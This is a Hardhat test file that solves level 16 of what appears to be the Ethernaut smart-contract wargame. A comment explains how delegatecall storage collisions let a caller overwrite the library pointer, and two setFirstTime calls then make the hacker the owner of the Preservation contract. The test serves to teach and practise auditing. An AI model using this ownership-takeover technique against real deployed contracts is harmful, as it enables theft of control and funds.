import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 16 - Preservation contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const PreservationContract = await ethers.getContractFactory("Preservation");
        const LibraryContract = await ethers.getContractFactory("LibraryContract");

        const libraryOne = await LibraryContract.deploy();
        const libraryTwo = await LibraryContract.deploy();
        const preservation = await PreservationContract.deploy(await libraryOne.getAddress(), await libraryTwo.getAddress());

        const PreservationHackerContract = await ethers.getContractFactory("PreservationHack");
        const preservationHack = await PreservationHackerContract.deploy();

        return {owner, hacker, preservation, preservationHack, libraryOne, libraryTwo};
    };
    
    describe("When hacking", () => {
        it("After setting timeZone1Library to the preservation hack contract, a call to setFirstTime() should modify the owner address", async() => {
            /*
             * Within the Preservation contract, both setFirstTime() and setSecondTime() public methods delegate a call
             * to their corresponding TimeZoneLibrary contracts. The delegatecall low-level method implements the delegatee
             * function logic in the context of the delegator contract -in this case, the Preservation contract.
             * 
             * However, the delegatee contract modifies the first slot at Preservation, which points to the timeZone1Library address.
             * By modifying that stored variable, the hacker points at the PreservationHack contract, which holds three variables.
             * Then, by calling setFirstTime() once again -keep in mind that it's public- the third variable is now modified,
             * which points to the owner of the Preservation contract.
             * 
             * There it goes! The hacker is the Preservation owner now.
            **/
            const {owner, hacker, preservation, preservationHack, libraryOne, libraryTwo} = await loadFixture(setUp);
            const preservationHackAddr = await preservationHack.getAddress();

            expect(await preservation.timeZone1Library()).to.equal(await libraryOne.getAddress());
            expect(await preservation.owner()).to.equal(owner.address);

            await preservation.connect(hacker).setFirstTime(preservationHackAddr);
            expect(await preservation.timeZone1Library()).to.equal(preservationHackAddr);

            await preservation.connect(hacker).setFirstTime(hacker.address);
            expect(await preservation.owner()).to.equal(hacker.address);
        });
    });
});